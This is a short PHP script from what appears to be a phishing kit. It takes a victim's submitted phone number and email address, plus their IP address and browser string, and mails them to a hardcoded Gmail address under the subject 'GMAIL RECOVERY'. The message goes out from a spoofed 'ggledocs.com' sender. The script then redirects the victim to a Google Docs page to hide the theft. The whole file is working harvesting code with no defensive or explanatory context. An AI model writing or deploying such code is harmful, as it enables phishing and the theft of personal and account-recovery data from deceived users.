<?
$IP = getenv("REMOTE_ADDR");
$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "Phone:".$_POST['emailphone']."\n";
$message .= "Email:".$_POST['emailphone2']."\n";
$message .= "IP: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="royabdi40@gmail.com";

$subject = "GMAIL RECOVERY";
$headers = "From: OneDocment <NONE@ggledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://docs.google.com/file/d/0B6zOv6vjXCc1OVVtTFBNVmpSdXc/edit");
?>